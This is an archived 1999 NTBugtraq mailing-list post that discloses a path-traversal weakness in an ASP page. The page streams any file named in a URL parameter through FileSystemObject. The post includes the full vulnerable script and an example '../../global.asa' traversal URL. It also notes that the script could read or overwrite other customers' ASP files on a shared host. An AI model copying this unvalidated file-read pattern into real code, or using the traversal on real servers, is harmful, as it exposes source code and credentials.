=== Content from marc.info_813f03c9_20250125_205142.html ===

```
[[prev in list](?l=ntbugtraq&m=91876759319299&w=2)] [[next in list](?l=ntbugtraq&m=91877679928871&w=2)] [prev in thread] [[next in thread](?l=ntbugtraq&m=91877679928871&w=2)]
List:       [ntbugtraq](?l=ntbugtraq&r=1&w=2)
Subject:    [Using FSO in ASP to view just about anything](?t=91877478500001&r=1&w=2)
From:       [Gary Geisbert <gary () NEWSLETTERS ! COM>](?a=91877478100001&r=1&w=2)
Date:       [1999-02-11 22:37:18](?l=ntbugtraq&r=1&w=2&b=199902)
[Download RAW [message](?l=ntbugtraq&m=91877455626320&q=mbox) or [body](?l=ntbugtraq&m=91877455626320&q=raw)]

This active server page opens the FileSystemObject and streams the contents
of the file specified in the "file" parameter.  The problem with FSO is that
you can go 'outside' of the "\InetPub\wwwRoot\" directory using "../".

e.g.
<http://www.server.foo/showfile.asp?file=../../global.asa>

Another problem is that since the file is being read with a TextStream, ASP
code will not be executed.  So if the file specified is an ASP file, the
results will be similar to the ::$DATA exploit.

For example: If this file was placed on the server of a web hosting company
who allows ASP, a malicious user could use it not only to view the source of
*any* other user's ASP code, but also (with a small modification) stream
data into other users' ASP files.  This would essentially overwrite whatever
is currently there.

-------[ cut here: showfile.asp ]-------

<%
' grab the file from the URL
FileName = Request.QueryString("file")

' create the filesystemobject and open the file
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts = fso.OpenTextFile(Server.MapPath(FileName))

' read the contents
ShowTheFreakinThing = ts.ReadAll

' display them
Response.Write ShowTheFreakinThing

' EOF
%>

-------[ cut here: showfile.asp ]-------

That's about it.  Email me if you have questions.

-Gary Geisbert (gary@newsletters.com)

[[prev in list](?l=ntbugtraq&m=91876759319299&w=2)] [[next in list](?l=ntbugtraq&m=91877679928871&w=2)] [prev in thread] [[next in thread](?l=ntbugtraq&m=91877679928871&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


